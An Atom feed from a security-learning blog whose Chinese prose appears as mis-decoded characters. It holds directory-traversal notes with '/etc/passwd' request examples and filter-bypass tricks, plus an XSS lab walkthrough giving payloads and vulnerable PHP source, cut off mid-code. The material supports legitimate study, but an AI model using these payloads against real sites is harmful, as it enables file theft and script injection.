<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://singlemindedt.github.io/"/>
  <updated>2020-08-24T04:53:15.868Z</updated>
  <id>https://singlemindedt.github.io/</id>
  
  <author>
    <name>Smtsec</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ç›®å½•ç©¿è¶Šæ¼æ´</title>
    <link href="https://singlemindedt.github.io/2020/08/24/%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%E6%BC%8F%E6%B4%9E/"/>
    <id>https://singlemindedt.github.io/2020/08/24/ç›®å½•ç©¿è¶Šæ¼æ´/</id>
    <published>2020-08-24T01:42:05.000Z</published>
    <updated>2020-08-24T04:53:15.868Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-ç›®å½•ç©¿è¶Š"><a href="#1-ç›®å½•ç©¿è¶Š" class="headerlink" title="1. ç›®å½•ç©¿è¶Š"></a>1. ç›®å½•ç©¿è¶Š</h2><p>ç›®å½•ç©¿è¶Šçš„ç›®çš„æ—¨åœ¨è®¿é—®å­˜åœ¨äºç½‘ç«™æ ¹ç›®å½•å¤–é¢çš„æ–‡ä»¶æˆ–ç›®å½•ã€‚é€šè¿‡æµè§ˆåº”ç”¨ï¼Œæ”»å‡»è€…å¯ä»¥å¯»æ‰¾å­˜å‚¨åœ¨WebæœåŠ¡å™¨ä¸Šçš„å…¶ä»–æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„ã€‚æ”»å‡»è€…è‹¥å¯è®¿é—®ä½äºåº”ç”¨æœåŠ¡å™¨æˆ–å…¶ä»–åç«¯æ–‡ä»¶ç³»ç»Ÿçš„æ–‡ä»¶æˆ–ç›®å½•ï¼Œå°±å¯èƒ½å‡ºç°è·¯å¾„ç©¿è¶Šæ¼æ´ï¼Œæ”»å‡»è€…é€šè¿‡<code>..\</code>å‘ä¸Šå›æº¯ï¼Œä»è€Œè®¿é—®æœåŠ¡å™¨ä¸Šä»»æ„æ–‡ä»¶ã€‚</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Unixæ“ä½œç³»ç»Ÿä¸Šï¼Œ<span class="string">../</span> æ˜¯ä¸€ä¸ªæ ‡å‡†çš„è¿”å›ä¸Šä¸€çº§è·¯å¾„çš„è¯­æ³•ï¼›</span><br><span class="line"></span><br><span class="line">Windowsæ“ä½œç³»ç»Ÿä¸Šï¼Œ <span class="string">../</span> å’Œ <span class="string">..</span>\ éƒ½æ˜¯è¿”å›ä¸Šä¸€çº§çš„è¯­å¥ã€‚</span><br></pre></td></tr></table></figure><h2 id="2-ä¸€èˆ¬å½¢å¼ï¼š"><a href="#2-ä¸€èˆ¬å½¢å¼ï¼š" class="headerlink" title="2. ä¸€èˆ¬å½¢å¼ï¼š"></a>2. ä¸€èˆ¬å½¢å¼ï¼š</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://***/go.action?file=..\..\etc\passwd</span><br><span class="line">https://www.*****.com/loadImage?filename=../../../etc/passwd</span><br></pre></td></tr></table></figure><h2 id="3-ç»•è¿‡æ–¹æ³•ï¼š"><a href="#3-ç»•è¿‡æ–¹æ³•ï¼š" class="headerlink" title="3. ç»•è¿‡æ–¹æ³•ï¼š"></a>3. ç»•è¿‡æ–¹æ³•ï¼š</h2><ol><li>ç»å¯¹è·¯å¾„</li><li>åŒå†™<code>../</code>ç»•è¿‡</li><li>URLç¼–ç ç»•è¿‡</li><li>ç»å¯¹è·¯å¾„+<code>../</code></li><li>%00æˆªæ–­æ–‡ä»¶åç¼€</li><li>Unicodeç¼–ç ç»•è¿‡</li></ol><h2 id="4-é˜²å¾¡ï¼š"><a href="#4-é˜²å¾¡ï¼š" class="headerlink" title="4. é˜²å¾¡ï¼š"></a>4. é˜²å¾¡ï¼š</h2><ol><li>è¾“å…¥æ·»åŠ ç™½åå•</li><li>php.inié…ç½®open_basedir</li><li>è¿‡æ»¤å…³é”®å­—ç¬¦<code>../</code></li></ol><h2 id="5-å‚è€ƒï¼š"><a href="#5-å‚è€ƒï¼š" class="headerlink" title="5. å‚è€ƒï¼š"></a>5. å‚è€ƒï¼š</h2><ol><li><p><a href="https://blog.csdn.net/angry_program/article/details/107855078" target="_blank" rel="noopener">ç›®å½•ç©¿è¶Š/éå†æ¼æ´</a></p></li><li><p><a href="https://www.cnblogs.com/vo-ov/p/3745651.html" target="_blank" rel="noopener">ç½‘ç«™å®‰å…¨(13) â€”â€”ç›®å½•ç©¿è¶Šæ¼æ´(Directory Traversal)</a></p></li><li><p><a href="https://www.lstazl.com/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</a></p></li><li><p><a href="http://wp.blkstone.me/2018/06/abusing-arbitrary-file-read/#5" target="_blank" rel="noopener">ä»»æ„æ–‡ä»¶è¯»å–çš„æ·±åº¦åˆ©ç”¨</a></p></li><li><p><a href="https://www.cdxy.me/?p=554" target="_blank" rel="noopener">æ¼æ´æ‰‹è®°-ä»»æ„æ–‡ä»¶è¯»å–</a></p></li><li><p><a href="https://blog.netspi.com/directory-traversal-file-inclusion-proc-file-system/" target="_blank" rel="noopener">ç›®å½•éå†ï¼Œæ–‡ä»¶åŒ…å«å’ŒProcæ–‡ä»¶ç³»ç»Ÿ</a></p></li><li><p><a href="http://xdxd.love/2016/05/23/ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–æ¼æ´åˆ†æ/" target="_blank" rel="noopener">ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–æ¼æ´è®°å½•</a></p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;1-ç›®å½•ç©¿è¶Š&quot;&gt;&lt;a href=&quot;#1-ç›®å½•ç©¿è¶Š&quot; class=&quot;headerlink&quot; title=&quot;1. ç›®å½•ç©¿è¶Š&quot;&gt;&lt;/a&gt;1. ç›®å½•ç©¿è¶Š&lt;/h2&gt;&lt;p&gt;ç›®å½•ç©¿è¶Šçš„ç›®çš„æ—¨åœ¨è®¿é—®å­˜åœ¨äºç½‘ç«™æ ¹ç›®å½•å¤–é¢çš„æ–‡ä»¶æˆ–ç›®å½•ã€‚é€šè¿‡æµè§ˆåº”ç”¨ï¼Œæ”»å‡»è€…å¯ä»¥å¯»æ‰¾å­˜å‚¨åœ¨WebæœåŠ¡å™¨ä¸Š
      
    
    </summary>
    
    
      <category term="notes" scheme="https://singlemindedt.github.io/tags/notes/"/>
    
      <category term="security" scheme="https://singlemindedt.github.io/tags/security/"/>
    
  </entry>
  
  <entry>
    <title>CTFHub-wp</title>
    <link href="https://singlemindedt.github.io/2020/08/12/CTFHub-wp/"/>
    <id>https://singlemindedt.github.io/2020/08/12/CTFHub-wp/</id>
    <published>2020-08-12T05:42:00.000Z</published>
    <updated>2020-08-24T04:25:09.339Z</updated>
    
    <content type="html"><![CDATA[<p>ç›®å½•éå†</p><p>ç‚¹å‡»<code>ç‚¹å‡»å¼€å§‹å¯»æ‰¾flag</code>,ç›´æ¥ç»™å‡ºäº†ç›®å½•ï¼Œåœ¨flag_in_here/4/2ä¸‹æ‰¾åˆ°flagï¼›</p><blockquote><p>è¯¥é¢˜ç›®ç›´æ¥ç»™äº†æ”»å‡»è€…ç›®å½•çš„è®¿é—®æƒé™ï¼Œç›´æ¥éå†æŸ¥æ‰¾å³å¯ï¼›</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ç›®å½•éå†&lt;/p&gt;
&lt;p&gt;ç‚¹å‡»&lt;code&gt;ç‚¹å‡»å¼€å§‹å¯»æ‰¾flag&lt;/code&gt;,ç›´æ¥ç»™å‡ºäº†ç›®å½•ï¼Œåœ¨flag_in_here/4/2ä¸‹æ‰¾åˆ°flagï¼›&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;è¯¥é¢˜ç›®ç›´æ¥ç»™äº†æ”»å‡»è€…ç›®å½•çš„è®¿é—®æƒé™ï¼Œç›´æ¥éå†æŸ¥æ‰¾å³å¯ï¼›&lt;/p&gt;
&lt;/blockquote&gt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://singlemindedt.github.io/tags/CTF/"/>
    
      <category term="wp" scheme="https://singlemindedt.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>XSSå°æ¸¸æˆ</title>
    <link href="https://singlemindedt.github.io/2020/08/04/XSS%E5%B0%8F%E6%B8%B8%E6%88%8F/"/>
    <id>https://singlemindedt.github.io/2020/08/04/XSSå°æ¸¸æˆ/</id>
    <published>2020-08-04T04:35:43.000Z</published>
    <updated>2020-08-28T11:07:48.940Z</updated>
    
    <content type="html"><![CDATA[<h3 id="ç¬¬1å…³"><a href="#ç¬¬1å…³" class="headerlink" title="ç¬¬1å…³"></a>ç¬¬1å…³</h3><p>è¾“å…¥å˜é‡è¢«ç›´æ¥è¾“å‡ºï¼›</p><p>å°è¯•ï¼š</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/xssgame-master/level1.php?name=<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>æˆåŠŸï¼›</p><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GETæ–¹å¼å°†nameçš„å€¼ä¼ ç»™`$str`å˜é‡ï¼Œä¸”æœªä½œä»»ä½•è¿‡æ»¤é™åˆ¶ï¼›</span><br></pre></td></tr></table></figure><h3 id="ç¬¬2å…³"><a href="#ç¬¬2å…³" class="headerlink" title="ç¬¬2å…³"></a>ç¬¬2å…³</h3><p>keywordå˜é‡é€šè¿‡<strong>GET</strong>æ–¹å¼ä¼ å…¥ï¼Œèµ‹å€¼ç»™<code>$str</code>å˜é‡ï¼Œç„¶åå¸¦å…¥åˆ°<code>&lt;h2&gt;</code>æ ‡ç­¾ä¸­å’Œ<code>&lt;input&gt;</code>æ ‡ç­¾ï¼›<code>&lt;h2&gt;</code>æ ‡ç­¾ç»è¿‡äº†<code>htmlspecialchars($str)</code>ç¼–ç ï¼Œ<code>&lt;input&gt;</code>æ ‡ç­¾æ²¡æœ‰ä»»ä½•è¿‡æ»¤ï¼Œæ‰€ä»¥å°è¯•å¯¹<code>&lt;input&gt;</code>æ ‡ç­¾è¿›è¡Œé—­åˆï¼Œæ¥è§¦å‘äº‹ä»¶ï¼Œä½¿ç”¨<code>&quot;&gt;</code>å®Œæˆé—­åˆã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/xssgame-master/level2.php?keyword=xss"&gt;&lt;script&gt;alert(1)&lt;/script&gt;//&amp;submit=%E6%90%9C%E7%B4%A2</span></span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str = $_GET[&quot;keyword&quot;];</span><br><span class="line">echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&apos;&lt;center&gt;</span><br><span class="line">&lt;form action=level2.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&apos;.$str.&apos;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=&quot;æœç´¢&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/center&gt;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="ğŸ–ï¼šhtmlspecialchars-å®šä¹‰å’Œç”¨æ³•"><a href="#ğŸ–ï¼šhtmlspecialchars-å®šä¹‰å’Œç”¨æ³•" class="headerlink" title="ğŸ–ï¼šhtmlspecialchars() å®šä¹‰å’Œç”¨æ³•"></a>ğŸ–ï¼š<a href="http://yige.org/php/func_string_htmlspecialchars.php" target="_blank" rel="noopener">htmlspecialchars() å®šä¹‰å’Œç”¨æ³•</a></h4><p>htmlspecialchars() å‡½æ•°æŠŠé¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ã€‚</p><p>é¢„å®šä¹‰çš„å­—ç¬¦æ˜¯ï¼š</p><ul><li>&amp; ï¼ˆå’Œå·ï¼‰æˆä¸º <code>&amp;amp</code>;</li><li>â€œ ï¼ˆåŒå¼•å·ï¼‰æˆä¸º <code>&amp;quot</code></li><li>â€˜ ï¼ˆå•å¼•å·ï¼‰æˆä¸º<code>&amp;#039</code> </li><li>&lt; ï¼ˆå°äºï¼‰æˆä¸º <code>&amp;lt</code></li><li>&gt; ï¼ˆå¤§äºï¼‰æˆä¸º <code>&amp;gt</code></li></ul><p>+++</p><p>ç»htmlspecialcharsï¼ˆï¼‰å¤„ç†çš„ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;title&gt;ç¬¬2å…³&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;ç¬¬2å…³ çª’æ¯çš„æ“ä½œ&lt;/h1&gt;</span><br><span class="line">&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&lt;center&gt;</span><br><span class="line">&lt;form action=level2.php method=GET&gt;</span><br><span class="line">&lt;input name=keyword  value=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;</span><br><span class="line">&lt;input type=submit name=submit value=&quot;æœç´¢&quot;/&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><p>+++</p><h3 id="ç¬¬3å…³"><a href="#ç¬¬3å…³" class="headerlink" title="ç¬¬3å…³"></a>ç¬¬3å…³</h3><p>è¾“å…¥çš„å˜é‡è¢«htmlspecialcharså‡½æ•°å¤„ç†äº†ï¼Œè¯¥å‡½æ•°é»˜è®¤çš„é…ç½®ä¸è¿‡æ»¤å•å¼•å·ï¼Œåªæœ‰è®¾ç½®äº†:quotestyleé€‰é¡¹ä¸ºENT_QUOTESæ‰ä¼šè¿‡æ»¤æ‰å•å¼•å·ã€‚åœ¨è¿™é‡Œè¿™ä¸ªå‡½æ•°å¤„ç†çš„å­—ç¬¦æœ‰<code>&lt;  &gt;  &quot;</code> ï¼Œæ²¡æœ‰å¤„ç†å•å¼•å·ï¼Œå› æ­¤åˆ©ç”¨å•å¼•å·å’Œä¸å«<code>&lt;&gt;</code>çš„å‡½æ•°æ„é€ payloadï¼Œå…ˆé€šè¿‡å•å¼•å·é—­åˆvalue;</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/xssgame-master/level3.php?keyword=' onclick=alert(1) //</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/xssgame-master/level3.php?keyword=' onclick='alert(1)'</span></span><br><span class="line"><span class="comment">//onclick äº‹ä»¶ä¼šåœ¨å¯¹è±¡è¢«ç‚¹å‡»æ—¶å‘ç”Ÿã€‚</span></span><br><span class="line">http:<span class="comment">//127.0.0.1/xssgame-master/level3.php?keyword=' onmouseover=alert(1) x='</span></span><br><span class="line"><span class="comment">//onmouseover äº‹ä»¶ä¼šåœ¨é¼ æ ‡æŒ‡é’ˆç§»åŠ¨åˆ°æŒ‡å®šçš„å…ƒç´ ä¸Šæ—¶å‘ç”Ÿã€‚</span></span><br></pre></td></tr></table></figure><p>ğŸ–ï¼š<a href="https://www.runoob.com/jsref/event-onmouseover.html" target="_blank" rel="noopener">onmouseover äº‹ä»¶</a></p><p>htmlspecialcharså‡½æ•°å¤„ç†æƒ…å†µï¼š</p><p><img src="https://s1.ax1x.com/2020/08/28/doN90I.png" alt="doN90I.png"></p><p>+++</p><p><img src="https://s1.ax1x.com/2020/08/28/doNpnA.png" alt="doNpnA.png"></p><p>+++</p><h3 id="ç¬¬4å…³"><a href="#ç¬¬4å…³" class="headerlink" title="ç¬¬4å…³"></a>ç¬¬4å…³</h3><p>è¿‡æ»¤äº†å°–æ‹¬å·ï¼Œæ„é€ ä¸åŒ…å«è¿™ä¸¤ä¸ªç¬¦å·çš„payloadï¼Œvalueçš„å€¼ä¸ç¬¬ä¸‰å…³æœ‰æ‰€å·®å¼‚ï¼Œè¿™é‡Œéœ€è¦ä½¿ç”¨åŒå¼•å·ç”¨äºé—­åˆvalueæ ‡ç­¾ï¼›</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1/xssgame-master/level3.php?keyword=" onclick=alert(1) //</span></span><br></pre></td></tr></table></figure><p>å†ç‚¹å‡»ä¸€ä¸‹è¾“å…¥æ¡†å³å¯ï¼›</p><h3 id="ç¬¬5å…³"><a href="#ç¬¬5å…³" class="headerlink" title="ç¬¬5å…³"></a>ç¬¬5å…³</h3><p><code>&lt;script\on</code>è¢«æ›¿æ¢ä¸º<code>&lt;scr_ipt\o_n</code>;ä½¿ç”¨å…¶ä»–çš„å‡½æ•°æ„é€ payloadï¼›</p><p>ğŸ–ï¼š<a href="https://www.w3school.com.cn/js/jsref_events.asp" target="_blank" rel="noopener">JavaScript äº‹ä»¶å‚è€ƒæ‰‹å†Œ</a></p><p>ç”±äºJavaScriptäº‹ä»¶éƒ½å«æœ‰onï¼Œæ‰€ä»¥è¿™é‡Œæš‚æ—¶æ— æ³•ä½¿ç”¨JavaScriptäº‹ä»¶æ¥å¼¹çª—ï¼›</p><p>è¿™é‡Œåˆ©ç”¨<code>&lt;a&gt; æ ‡ç­¾çš„ href å±æ€§</code>ï¼š</p><p>ğŸ–ï¼š<a href="https://www.w3school.com.cn/tags/att_a_href.asp" target="_blank" rel="noopener"><a> æ ‡ç­¾çš„ href å±æ€§</a></a></p><blockquote><p><a> æ ‡ç­¾çš„ href å±æ€§ç”¨äºæŒ‡å®šè¶…é“¾æ¥ç›®æ ‡çš„ URLã€‚</a></p><p>href å±æ€§çš„å€¼å¯ä»¥æ˜¯ä»»ä½•æœ‰æ•ˆæ–‡æ¡£çš„ç›¸å¯¹æˆ–ç»å¯¹ URLï¼ŒåŒ…æ‹¬ç‰‡æ®µæ ‡è¯†ç¬¦å’Œ JavaScript ä»£ç æ®µã€‚å¦‚æœç”¨æˆ·é€‰æ‹©äº† <a> æ ‡ç­¾ä¸­çš„å†…å®¹ï¼Œé‚£ä¹ˆæµè§ˆå™¨ä¼šå°è¯•æ£€ç´¢å¹¶æ˜¾ç¤º href å±æ€§æŒ‡å®šçš„ URL æ‰€è¡¨ç¤ºçš„æ–‡æ¡£ï¼Œæˆ–è€…æ‰§è¡Œ JavaScript è¡¨è¾¾å¼ã€æ–¹æ³•å’Œå‡½æ•°çš„åˆ—è¡¨ã€‚</a></p></blockquote><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;a href="</span>javascrip<span class="variable">t:alert</span>(<span class="number">1</span>)<span class="comment">"&gt;xss&lt;/a&gt;</span></span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span>.htmlspecialchars($str).<span class="string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ğŸ–ï¼š strtolower() å‡½æ•°æŠŠå­—ç¬¦ä¸²è½¬æ¢ä¸ºå°å†™ï¼›</p><p>ç›¸å…³ï¼š</p><table><thead><tr><th>å‡½æ•°</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>lcfirst()</td><td>æŠŠå­—ç¬¦ä¸²ä¸­çš„é¦–å­—ç¬¦è½¬æ¢ä¸ºå°å†™</td></tr><tr><td>strtoupper()</td><td>æŠŠå­—ç¬¦ä¸²è½¬æ¢ä¸ºå¤§å†™</td></tr><tr><td>ucfirst()</td><td>æŠŠå­—ç¬¦ä¸²ä¸­çš„é¦–å­—ç¬¦è½¬æ¢ä¸ºå¤§å†™</td></tr><tr><td>ucwords()</td><td>æŠŠå­—ç¬¦ä¸²ä¸­æ¯ä¸ªå•è¯çš„é¦–å­—ç¬¦è½¬æ¢ä¸ºå¤§å†™</td></tr></tbody></table><h3 id="ç¬¬6å…³"><a href="#ç¬¬6å…³" class="headerlink" title="ç¬¬6å…³"></a>ç¬¬6å…³</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span>.htmlspecialchars($str).<span class="string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å°†â€&lt;scriptâ€ã€â€onâ€ã€â€srcâ€ã€â€dataâ€ã€â€hrefâ€éƒ½è¿›è¡Œäº†æ›¿æ¢ï¼Œä½†æœªå¯¹å¤§å°å†™è¿›è¡Œç»Ÿä¸€åˆ¤å®šå¤„ç†ï¼Œå¯åˆ©ç”¨å¤§å°å†™ç»•è¿‡ï¼›</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">Script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">Script</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="ç¬¬7å…³"><a href="#ç¬¬7å…³" class="headerlink" title="ç¬¬7å…³"></a>ç¬¬7å…³</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str =strtolower( $_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">""</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">""</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">""</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">""</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ"</span>.htmlspecialchars($str).<span class="string">"ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=æœç´¢ /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿›è¡Œäº†å°å†™è½¬æ¢ï¼ŒåŒæ—¶å°†æ•æ„Ÿå­—ç¬¦æ›¿æ¢ä¸ºç©º;</p><p>å¯ä»¥ä½¿ç”¨åŒå†™ç»•è¿‡ï¼›</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">"&gt;<span class="tag">&lt;<span class="name">scscriptript</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">scscriptript</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="ç¬¬8å…³"><a href="#ç¬¬8å…³" class="headerlink" title="ç¬¬8å…³"></a>ç¬¬8å…³</h3><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span 